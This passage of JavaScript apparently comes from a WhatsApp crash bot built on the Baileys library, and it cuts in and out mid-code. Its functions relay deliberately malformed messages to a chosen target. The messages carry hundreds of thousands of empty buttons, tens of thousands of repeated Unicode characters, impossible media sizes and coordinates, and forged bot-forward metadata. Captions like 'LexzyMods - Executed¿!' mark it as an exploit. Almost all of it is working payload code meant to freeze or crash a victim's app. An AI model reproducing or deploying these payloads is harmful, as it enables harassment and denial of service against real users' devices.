                jpegThumbnail: "/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wAARCAAeACADASIAAhEBAxEB/8QAGgAAAgIDAAAAAAAAAAAAAAAAAAQCBQEDBv/EACcQAAEDAwMDBAMAAAAAAAAAAAECAwQFERIFITEGE0EUIkFRcWGR/8QAFBEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/AOErFPRNNXMaaLS09Rx1SAFGwASkKJpkenpmeKi0Bfchd9vf48fNBUUVcO6Gcy0w+lbqAOolYxAJFwEnzff6rXM0ORFidyXGloSP2xVwb2IHvagTjzpMZGDLykJyysLc8VIajMHElzZOPPi+VvvelaKB38vPxx7ty2ONr+Kg/qUyS2pt6QtaFWuD/KVooP/Z",
                hasMediaAttachment: true
              }
            },
            body: {
              text: "\u0000",
            },
            nativeFlowMessage: {
              buttons: "[]".repeat(9000),
            }
          }
        }
      }
    }, { participant: true })
  }

  await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            header: {
              imageMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                mimetype: "image/jpeg",
                fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
                fileLength: Math.floor(Math.random() * 18446744073709551615),
                height: 99999,
                width: 99999,
                mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
                fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
                directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
                mediaKeyTimestamp: 1776937541,
                jpegThumbnail: null,
                caption: "LexzyMods - Executed¿!",
                firstScanLength: 999999999,
                firstScanSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
                experimentGroupId: 999999999,
                interactiveAnnotations: [],
                scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
                scanLengths: [999999999999, 999999999999, 999999999999, 999999999999],
                annotations: [],
                midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0=",
                midQualityFileEncSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
              },
              hasMediaAttachment: true
            },
            body: {
              text: "NanasMuda - BackEraa"
            },
            nativeFlowMessage: {
              buttons: "]".repeat(5000)
            },
            nativeFlowMessage: {
              buttons: Array.from({ length: 500000 }, () => ({}))
            }
          }
        }
      }
    }, { participant: true });

const asuw = {
        messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
            botMetadata: {
                pluginMetadata: {},
                richResponseSourcesMetadata: {
                    sources: []
                }
            }
        },
        groupStatusMessageV2: {
            message: {
                richResponseMessage: {
                    messageType: 1,
                    submessages: [
                        {
                            messageType: 3,
                            tableMetadata: {
                                title: "LexzyMods - Executed¿!",
                                rows: Array.from({ length: 2000 }, () => ({}))
                            }
                        }
                    ],
                    unifiedResponse: {
                        data: JSON.stringify({
                            response_id: crypto.randomUUID(),
                            sections: []
                        })
                    },
                    contextInfo: {
                        forwardingScore: 1,
                        isForwarded: true,
                        forwardedAiBotMessageInfo: {
                            botJid: "NanasXExecutedXAllTeam"
                        },
                        forwardOrigin: 3
                    }
                }
            }
        }
    };

    const asoww = generateWAMessageFromContent(target, asuw, {});

    await sock.relayMessage(target, asoww, {
        participant: true,
    });
}

async function PrivateNew2027V5(sock, target) {
  const largeThumbnail = Buffer.alloc(500_500, 'A').toString('base64');
  const generateId = () => Math.random().toString(36).substring(2, 15);

  const generateWAMessageFromContent = (jid, message, options = {}) => {
    return {
      key: {
        remoteJid: jid,
        fromMe: true,
        id: generateId()
      },
      message: message,
      messageTimestamp: Date.now(),
      pushName: "LexzyMods"
    };
  };

  const LexMsg = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
              fileLength: 9999,
              height: 9999,
              width: 9999,
              mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
              fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
              directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1776937541",
              jpegThumbnail: null,
              caption: "LexzyMods - Executed¿!",
              scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
              scanLengths: [
                9999999999999999999,
                9999999999999999999,
                9999999999999999999,
                9999999999999999999
              ],
              midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
            }
          },
          body: {
            text: "Iniochamy - Executed¿!"
          },
          nativeFlowMessage: {
            buttons: Array.from({ length: 500000 }, () => ({}))
          }
        }
      }
    }
  };

  const Lexca = generateWAMessageFromContent(target, LexMsg, {});

  await sock.relayMessage(target, Lexca.message, {
    participant: true,
    messageId: Lexca.key.id
  });

  const Lexcaa = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "Lexcaabos - Executed¿!"
          },
          nativeFlowMessage: {
            buttons: Array.from({ length: 500000 }, () => ({}))
          }
        }
      }
    }
  };

  const Lexcaabos = generateWAMessageFromContent(target, Lexcaa, {});

  await sock.relayMessage(target, Lexcaabos.message, {
    participant: true,
    messageId: Lexcaabos.key.id
  });

  const msg = {
    key: { remoteJid: "status@broadcast", fromMe: true, id: generateId() },
    message: {
      imageMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0&mms3=true",
        mimetype: "image/jpeg",
        caption: "iniochamy¿!",
        fileSha256: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
        fileLength: 9999999,
        height: 9999,
        width: 9999,
        mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
        fileEncSha256: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
        directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1776937541",
        jpegThumbnail: largeThumbnail,
        scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
        scanLengths: [
          2899999999999999077,
          1799999999999998555,
          7699999999999999148,
          1069999999999999164
        ],
        midQualityFileSha256: "Gt6RODauIu1fIwGhRg1TeEIkeguwn+ylFauogg+pQOk=",
        contextInfo: {
          pairedMediaType: "RICH_TEXT_MESSAGE",
          isQuestion: true,
          isGroupStatus: false,
          remoteJid: "1234567890-987654321@g.us",
          entryPointConversionDelaySeconds: 120,
          entryPointConversionSource: "group_chat"
        }
      }
    }
  };

  await sock.relayMessage("status@broadcast", msg.message, {
    statusJidList: [target],
    messageId: msg.key.id,
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: { jid: target },
          content: undefined
        }]
      }]
    }]
  });

  await sock.relayMessage(target, {
    statusMentionMessage: {
      message: {
        protocolMessage: {
          key: msg.key,
          type: 25
        },
        additionalNodes: [{
          tag: "meta",
          attrs: { is_status_mention: "false" },
          content: undefined
        }]
      }
    }
  }, {});

  await sock.relayMessage(target, {
    statusMentionMessage: {
      message: {
        protocolMessage: {
          key: msg.key,
          type: 25
        }
      }
    }
  }, {});

  const a = {
    interactiveMessage: {
      header: {
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgARQMBIgACEQEDEQH/xAAtAAEAAwEBAAAAAAAAAAAAAAAAAQQFBgIBAQEBAAAAAAAAAAAAAAAAAAABAv/aAAwDAQACEAMQAAAA5kE3aIuxTAAAE7mf2xg4/ZZZyiYAAL3UcZ0M1p505aZsFgACxXGln+QAAAAAAB//xAAkEAACAgIBBAEFAAAAAAAAAAABAgADBBExBRMgIhASMDJAcf/aAAgBAQABPwD4HI3O9Q35JO7Rxo6lltBr0qnf3wNnUxuks6B3jdMrA4mViNR/PLAQWZVYMLBdDYlzBRMtBZQ8Pj046y652Vstsdt7UjUzFLgCfSKsWw7h58a3Nbqw5BleXYxays+pHtLstiuww3L7WWoqW2zedGS9BOuDyJZmoy+tYDRmLHZ/W//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQIBAT8AT//EABcRAAMBAAAAAAAAAAAAAAAAAAAwQQH/2gAIAQMBAT8AXlI3/9k=",
        hasMediaAttachment: true
      },
      body: {},
      nativeFlowMessage: {
        buttons: [
          {
            name: "order_status",
            buttonParamsJson: `{
  \"currency\":\"IDR\",
  \"total_amount\":{\"value\":0,\"offset\":100},
  \"reference_id\":\"${"NanasPrivate" + "ြ".repeat(75000)}\",
  \"type\":\"physical-goods\",
  \"order\":{
    \"status\":\"pending\",
    \"order_type\":\"PAYMENT_REQUEST\",
    \"items\":[
      {
        \"name\":\"${"LexzyMods" + "ြ".repeat(75000)}\",
        \"quantity\":-9,
        \"price\":{\"value\":0,\"offset\":100}
      }
    ]
  }
}`
          }
        ],
        messageParamsJson: ""
      },
      contextInfo: {
        forwardingScore: 9999,
        isForwarded: true,
        pairedMediaType: "NOT_PAIRED_MEDIA"
      }
    }
  };

  await sock.relayMessage(target, a, {});

  const b = {
    stickerPackMessage: {
      stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
      name: "ꦾ".repeat(75000),
      publisher: "iniochamy - Executed¿!" + "ꦾ".repeat(5000),
      stickers: [],
      fileLength: "366299919",
      fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
      fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
      mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
      directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
      contextInfo: {
        remoteJid: "X",
        participant: "0@s.whatsapp.net",
        stanzaId: "1234567890ABCDEF",
        mentionedJid: ["13135555555@s.whatsapp.net"]
      },
      packDescription: "",
      mediaKeyTimestamp: "1747502082",
      trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
      thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
      thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
      thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
      thumbnailHeight: 999999999,
      thumbnailWidth: 9999999999,
      imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
      stickerPackSize: "9990099",
      stickerPackOrigin: "USER_CREATED"
    }
  };

  await sock.relayMessage(target, b, {});

  const c = {
    ephemeralMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "Students Func Nanas",
            locationMessage: {
              degreesLatitude: -999.03499999999999,
              degreesLongitude: 922.9999999999999,
              name: "LexzyMods",
              address: "X",
              jpegThumbnail: null,
            },
            hasMediaAttachment: true,
          },
          body: {
            text: "LexzyMods - Executed¿!",
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: "ြ ".repeat(9000),
              },
              {
                name: "address_message",
                buttonParamsJson: "ြ ".repeat(9000),
              },
              {
                name: "galaxy_message",
                buttonParamsJson: "ြ ".repeat(75000),
              },
            ],
            messageParamsJson: "wa.me/stickerpack/LexzyMods",
            messageVersion: 1,
          },
        },
      },
    },
  };

  await sock.relayMessage(target, c, {});

  const d = {
    groupStatusMessageV2: {
      message: {
        videoMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/609348532_2813167542392969_465741537439148405_n.enc?ccb=11-4&oh=01_Q5Aa4AGN8v9HYNPCRbPeMILfoQ7MIqSvhY-gd7wr6YvDHhHSwA&oe=69EB192E&_nc_sid=5e03e0&mms3=true",
          mimetype: "video/mp4",
          caption: "LexzyMods - Executed¿!",
          fileSha256: "LdNOQNcNIvlIijHvkpwRIY/zIoTfWQoFux7dzTHusyM=",
          fileLength: "1099511627776",
          seconds: 172800,
          mediaKey: "G2MGbP7BZLi1RwpyyV4DeXtfttaclMVSKfqNldZDt20=",
          height: 1080,
          width: 1920,
          fileEncSha256: "U4uKZrZeJpg8smAcMRT3qtPoviAp/dqGa63GzqYcS8E=",
          directPath: "/v/t62.7161-24/609348532_2813167542392969_465741537439148405_n.enc?ccb=11-4&oh=01_Q5Aa4AGN8v9HYNPCRbPeMILfoQ7MIqSvhY-gd7wr6YvDHhHSwA&oe=69EB192E&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1774428565",
          jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKAMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAgMEBQYBAQEBAQEAAAAAAAAAAAAAAAAAAgMB/9oADAMBAAIQAxAAAADzL0VRwnekefd8ThLRzuO2/JxNWKr5ZFS+12VFgitnN6HKX8UQ1y6bCz0xiswAP//EACQQAAICAQQBBAMAAAAAAAAAAAECAAMREhMhMVIQQQIgQVFS/9oACAEBAAE/APi9NXgJtVeAgqq8BNmrwE2qvASx8YAGSY6XhM6ADK67rG0k6Zz0ex7EoHrL9ZltulMoMyi8sgY4jNhmycnMFgnqC5AYdAytToLseCJUFstFYfiKoFtidkGFZfWNpgIrl61B4HUrC1EkMfowNm4n8kQmEZioEezJ6ms9Z4jMAARAwZQRN+n+gl/qFNrFeobQScCaz+5Xdob6+X//xAAbEQACAgMBAAAAAAAAAAAAAAABESACECAhQf/aAAgBAgEBPwB6PFEYa+4pwwkLX//EABsRAAICAwEAAAAAAAAAAAAAAAECABEDICEQ/9oACAEDAQE/ANskB8fqxVNgxlF80//Z",
          annotations: [
            {
              polygonVertices: [
                {
                  x: 0.17499999701976776,
                  y: 0.3379453122615814
                },
                {
                  x: 0.824999988079071,
                  y: 0.3379453122615814
                },
                {
                  x: 0.824999988079071,
                  y: 0.6620468497276306
                },
                {
                  x: 0.17499999701976776,
                  y: 0.6620468497276306
                }
              ],
              shouldSkipConfirmation: true,
              embeddedContent: {
                embeddedMusic: {
                  musicContentMediaId: "2261401457948346",
                  songId: "849859527815275",
                  author: "Lexcaabos - Executed¿!" + "ြ".repeat(9000),
                  title: "ြ".repeat(75000),
                  artworkDirectPath: "/v/t62.76458-24/568311115_4528169627440664_4559757974106869948_n.enc?ccb=11-4&oh=01_Q5Aa5AGs28VMFVXkcn0w9n-YUhiBwEPKyIwEcjWZLHm7mUgOsQ&oe=6A786B6E&_nc_sid=5e03e0",
                  artworkSha256: "FROyKnRoHfLzDwmz5tED8K3nmdK+4Uihn2ucHBZDjPI=",
                  artworkEncSha256: "y/SkheY3BoGhndQlmR6icfLtMtI4FjjRi5y3bsX13jw=",
                  artworkMediaKey: "s5VCH/gb/YjDXhek47MVcsHjVV3/lOHOYaDe72eodXw=",
                  artistAttribution: "https://www.instagram.com/_u/lexzymods",
                  countryBlocklist: "WEs=",
                  isExplicit: false
                }
              },
              embeddedAction: true
            }
          ]
        }
      }
    }
  };

  await sock.relayMessage(target, d, {});

  const bot = "867051314767696@bot";

  const e = {
    botForwardedMessage: {
      message: {
        richResponseMessage: {
          messageType: 1,

          submessages: [
            {
              messageType: 2,
              messageText: `@${bot.split("@")[0]}`
            },

            {
              messageType: 5,
              codeMetadata: {
                codeLanguage: "javascript",

                codeBlocks: [
                  {
                    highlightType: 1,
                    codeContent: "const = {"
                  },
                  {
                    highlightType: 2,
                    codeContent: "Lexcaabos - Executed¿!"
                  },
                  {
                    highlightType: 3,
                    codeContent: `${"\0".repeat(75000)}` + `${"\x10".repeat(25000)}`
                  }
                ]
              }
            }
          ],

          contextInfo: {
            mentionedJid: [bot],

            featureEligibilities: Array.from(
              { length: 1999 },
              () => ({
                canReceiveMultiReact: true
              })
            ),

            isForwarded: true,

            forwardedAiBotMessageInfo: {
              botJid: bot
            },

            forwardOrigin: 4
          }
        }
      }
    }
  };

  await sock.relayMessage(target, e, {});

  const g = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
              fileLength: 9999,
              height: 9999,
              width: 9999,
              mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
              fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
              directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1776937541",
              jpegThumbnail: null,
              caption: "LexzyMods - Executed¿!",
              scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
              scanLengths: [
                9999987899999999999999,
                998999999999999999999,
                999899999999999999999,
                9998789999999999999999
              ],
              midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
            }
          },
          body: {
            text: "Lexcaabos - Executed¿!",
          },
          nativeFlowMessage: {
            buttons: Array.from({ length: 450000 }, () => ({}))
          }
        }
      }
    }
  };

  const gMsg = generateWAMessageFromContent(target, g, {});

  await sock.relayMessage(target, gMsg.message, {
    participant: true,
    messageId: gMsg.key.id
  });

  const f = {
    newsletterAdminInviteMessage: {
      newsletterJid: "228773882@newsletter",
      newsletterName: "NanasMuda" + "ြ".repeat(75000),
      caption: "Pt Func Tergacorr" + "ြ".repeat(50000),
      inviteExpiration: Date.now() + 1814400000,
      contextInfo: {
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from(
            { length: 1900 },
            () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
          )
        ],
        remoteJid: "X",
        participant: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
        stanzaId: "123",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          },
          forwardedAiBotMessageInfo: {
            botName: "META AI",
            botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
            creatorName: "Lexzy Ganteng"
          }
        }
      }
    }
  };

  await sock.relayMessage(target, f, {
    participant: true,
  });

  const tombol = [
      {
          name: "single_select",
          buttonParamsJson: "ြ ".repeat(9000),
      },
  ];
      tombol.push(
          {
              name: "cta_call",
              buttonParamsJson: JSON.stringify({
                  display_text: "ꦽ".repeat(5000),
              }),
          },
          {
              name: "galaxy_message",
              buttonParamsJson: JSON.stringify({
                  display_text: "ꦽ".repeat(5000),
              }),
          },
          {
              name: "cta_copy",
              buttonParamsJson: JSON.stringify({
                  display_text: "ꦽ".repeat(5000),
              }),
          }
      );

  const i = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "ꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸ".repeat(9000),
            hasMediaAttachment: true,
          },
          body: {
            text: "ꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸ".repeat(9000),
          },
          footer: {
            text: "ꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸ".repeat(9000),
          },
          nativeFlowMessage: {
            buttons: tombol
          },
          contextInfo: {
            forwardingScore: 2147483647,
            isForwarded: true,
            isSampled: true,
            expireAt: 253402300799000,
            participant: target,
            remoteJid: "status@broadcast",
            stanzaId: "ြ".repeat(10000),
            deviceListMetadata: {
              senderKeyHash: "ြ".repeat(7000),
              senderTimestamp: "9999999999999",
              recipientKeyHash: "ြ".repeat(6000),
              recipientTimestamp: "8888888888888",
              userIdentity: "ြ".repeat(4000)
            },
            botInvocationMetadata: {
              botId: "exploit_bot@",
              invocationType: "BOT_INVOCATION_TYPE_QUERY",
              invocationSource: "BOT_INVOCATION_SOURCE_QUICK_REPLY",
              botMessageSecret: "ြ".repeat(4000)
            },
            quotedMessage: {
              extendedTextMessage: {
                text: "\x10".repeat(1000),
                contextInfo: {
                  forwardingScore: 999999,
                  isForwarded: true,
                  stanzaId: "ꦽ".repeat(10000),
                  participant: "0@s.whatsapp.net",
                  remoteJid: "status@broadcast",
                  deviceListMetadata: {
                    senderKeyHash: "ꦽ".repeat(1000),
                    recipientKeyHash: "ꦽ".repeat(1000)
                  }
                }
              }
            },
            conversionSource: "ꦽ".repeat(9000),
            conversionData: Buffer.from("ꦽ".repeat(1000)),
            conversionDelaySeconds: 2147483647,
            externalAdReply: {
              title: "ꦽ".repeat(2000),
              body: "ꦽ".repeat(2000),
              mediaType: "IMAGE",
              thumbnailUrl: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDABsSFBcUERsXFhceHBsgKEIrKCUlKFE6PTBCYFVlZF9VXVtqeJmBanGQc1tdhbWGkJ6jq62rZ4C8ybqmx5moq6T/2wBDARweHigjKE4rK06kbl1upKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKT/wgARCABIAEgDASIAAhEBAxEB/8QAGgAAAgMBAQAAAAAAAAAAAAAAAAUCAwQBBv/EABcBAQEBAQAAAAAAAAAAAAAAAAABAAP/2gAMAwEAAhADEAAAAN6N2jz1pyXxRZyu6NkzGrqzcHA0RukdlWTXqRmWLjrUwTOVm3OAXETtFZa9RN4tCZzV18lsll0y9OVmbmkcpbJslDflsuz7JafOepX0VEDrcjDpT6QLC4DrxaFFgHL/xAAaEQADAQEBAQAAAAAAAAAAAAAAARExAhEh/9oACAECAQE/AELJqiE/ELR5EdaJmxHWxfIjqLZ//8QAGxEAAgMBAQEAAAAAAAAAAAAAAAECEBEhMUH/2gAIAQMBAT8AZ9MGsdMzTcQuumR8GjymQfCQ/0yIxiP/xAArEAABBAECBQQCAgMAAAAAAAABAAIDEQQSEyIiIzFRMjNBYRBxExQkQoH/2gAIAQEAAT8Af6Ssn3SpXbWEpjHOcOHAlN6MQBJH6RiMkJdRIWVEYnhwYWg+VpJt5P1+H+g/pZHulZR6axHi9rvjso5GuYLFoT7H7QWgFavKHMY0UeK0U8zx4QUh5D+lOeqVMLYq2vFeVE7yNpExH7MpjvtSDcy1A6xSc4jsi/gtQyDyx/LioySA34C//4AAwD/2Q==",
              mediaUrl: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
              sourceUrl: "t.me/LexzyModss",
            }
          }
        }
      }
    }
  };

  await sock.relayMessage(target, i, {
    participant: true,
    messageId: generateId()
  });

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQNKGomvjg2Ua9Ssb7JYtGlIOzdTlA__XPLpMZKSvoxo4s0BNq8_yoFgyopdfQCKdG2jhRfR1vVszLR_YOXUzxOlIoMwjA9bjsibM-7Xjg",
              mimetype: "image/jpeg",
              caption: "LexzyMods - Executed¿!",
              fileSha256: "c9qyQBuWwI4bHiQX0TAmAq9V18JugSHKjal8BSOUVFY=",
              fileLength: "634893",
              height: 1022,
              width: 1080,
              mediaKey: "G6gr2DHkMBdjuZgWcc2zWMS1NGxY2VboQhxCG1f9GFA=",
              fileEncSha256: "PT14PXdJ92cCsZv9+U0ELlkX7jeFVzjUwcIb7Xn0+0A=",
              directPath: "/o1/v/t24/f2/m234/AQNKGomvjg2Ua9Ssb7JYtGlIOzdTlA__XPLpMZKSvoxo4s0BNq8_yoFgyopdfQCKdG2jhRfR1vVszLR_YOXUzxOlIoMwjA9bjsibM-7Xjg",
              mediaKeyTimestamp: "1782643133",
              jpegThumbnail: "/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wAARCAAeACADASIAAhEBAxEB/8QAGgAAAgIDAAAAAAAAAAAAAAAAAAQCBQEDBv/EACcQAAEDAwMDBAMAAAAAAAAAAAECAwQFERIFITEGE0EUIkFRcWGR/8QAFBEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/AOErFPRNNXMaaLS09Rx1SAFGwASkKJpkenpmeKi0Bfchd9vf48fNBUUVcO6Gcy0w+lbqAOolYxAJFwEnzff6rXM0ORFidyXGloSP2xVwb2IHvagTjzpMZGDLykJyysLc8VIajMHElzZOPPi+VvvelaKB38vPxx7ty2ONr+Kg/qUyS2pt6QtaFWuD/KVooP/Z",
              hasMediaAttachment: true
            }
          },
          body: {
            text: "\u0000",
          },
          nativeFlowMessage: {
            buttons: "[".repeat(7500),
          }
        }
      }
    }
  }, { participant: true })

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQNKGomvjg2Ua9Ssb7JYtGlIOzdTlA__XPLpMZKSvoxo4s0BNq8_yoFgyopdfQCKdG2jhRfR1vVszLR_YOXUzxOlIoMwjA9bjsibM-7Xjg",
              mimetype: "image/jpeg",
              caption: "iniochamy - Executed¿!",
              fileSha256: "c9qyQBuWwI4bHiQX0TAmAq9V18JugSHKjal8BSOUVFY=",
              fileLength: "634893",
              height: 1022,
              width: 1080,
              mediaKey: "G6gr2DHkMBdjuZgWcc2zWMS1NGxY2VboQhxCG1f9GFA=",
